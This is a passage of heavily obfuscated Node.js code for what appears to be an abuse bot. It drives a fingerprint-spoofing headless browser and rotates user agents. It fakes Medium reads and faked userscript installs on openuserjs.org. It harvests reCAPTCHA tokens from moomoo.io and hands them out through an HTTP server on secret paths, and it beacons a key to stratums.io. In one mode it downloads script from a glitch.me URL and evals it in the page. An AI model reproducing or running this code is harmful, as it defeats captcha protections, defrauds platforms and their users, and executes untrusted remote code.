      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0x8) + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x11) + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x1) + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + Y(0x1d) + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + Z(0x2) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + Y(0xc),
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + Y(0x3) + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x4d9 + -0x1 * 0x1ce7 + 0x21c0
  };

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x13ab + 0xb2b * 0x3 + -0xdd6);
    let h = e[f];
    if (c['FNsToK'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x2 * -0x653 + -0x57a * 0x3 + 0x1d14, r, s, t = -0x2267 * -0x1 + -0x2422 + -0x1 * -0x1bb; s = m['charAt'](t++); ~s && (r = q % (-0x2483 + -0x21bf + -0xa * -0x707) ? r * (0x12a * -0x5 + 0x137f * 0x1 + -0xd6d * 0x1) + s : s, q++ % (-0x17b3 * -0x1 + -0x1908 + 0x17 * 0xf)) ? o += String['fromCharCode'](-0x3b6 * 0x3 + 0x43a * -0x6 + 0x257d & r >> (-(0x25 * 0xc5 + -0x271 * -0x5 + -0x28ac * 0x1) * q & 0x539 * -0x7 + 0x1ced + -0x1c * -0x46)) : -0x3 * 0xb2d + -0x10f * 0x1f + 0x4258) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1 * -0x106e + 0xa75 * -0x3 + 0x2fcd, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1 * 0xf93 + 0x14cb * 0x1 + -0x528))['slice'](-(0x50d + 0x1798 + -0x1ca3));
        }
        return decodeURIComponent(p);
      };
      c['nLORTc'] = i, b = arguments, c['FNsToK'] = !![];
    }
    const j = e[0xc * -0x71 + -0x2616 + 0x1 * 0x2b62],
      k = f + j,
      l = b[k];
    return !l ? (h = c['nLORTc'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x17 * 0x103 + -0x1220 + -0x525)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xc7 * 0xd + 0x236d + 0x2 * -0x1692), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xf * 0x245 + 0x1 * -0xaf7 + -0x79 * 0x30), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xd * -0x1e9 + -0x17a4 + 0x3079;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1 * 0xee4 + 0x18a * 0xd + -0x83 * 0xa; w < getRandomInt(0x927 + -0x1e * -0x3b + -0x1010, 0x3db * -0x8 + 0x8e3 + -0x3a * -0x61); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xc0 * 0x11b + 0x14b * -0x17 + -0x4b7 * -0xb);
        }
      }();
    }, 0x1 * 0x55b + -0x20a1 + 0x1baa), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x59d + -0xd87 + 0x1324;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y[a0(0xf)](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x20f2 + 0x3 * -0xc41 + 0x3d1 * 0x1, -0xbb3 + -0x475 * -0x6 + -0xed9)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x82cf + -0x255c + 0x17bd);
    }, 0x1a4b + -0x1349 + 0xe * -0x79), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1c51 + -0x56 * 0x5c + 0x297;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x647 + 0x127d * -0x1 + 0x247c), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x17f0 + 0x3 * -0x6e1 + -0xa9 * 0x5), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x21e * -0xa7 + 0xa13dc + 0x24632);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * -0xd1e + 0x579 + 0x809);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xb * -0x18d + -0x22c1 + 0x42 * 0xcc);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xb * 0x50e + 0x7 * 0x8b6 + 0x1a30);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = d,
    a3 = c,
    a2 = b;
  async function f() {
    const a1 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1cf5 + 0x139 * -0xe + -0xbd6) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xf14 + -0x2d7 * -0x3 + 0x690));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xd6c + 0xf * -0x68 + -0x4 * -0x4e1, D['indexOf']('\x20'));
        return B ? E['slice'](0x2 * 0x151 + -0xd3 * -0x1f + -0x1c2f, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1 * 0x41ed + 0x377 + -0x3 * 0xa1c),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x19c * 0x3 + -0x34 * 0x1 + 0x2270),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': a1(0x12, 'T&bZ') + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      a2(0x18, 'hgzV') + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + a3(0xa) + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + a3(0x10) + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + a4(0x1c) + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * 0xe3b + 0x150a + -0x2345; k < 0xa17 + 0x212e + -0x2b41 * 0x1; k++)
    setTimeout(f, (-0xc2 + -0x1 * 0x11b51 + 0x20673) * k * getRandomInt(-0x3 * -0x5af + 0x1 * -0x1543 + 0x437, 0x1 * -0x24cd + 0x1abd + 0xa13 * 0x1));
  setInterval(() => {
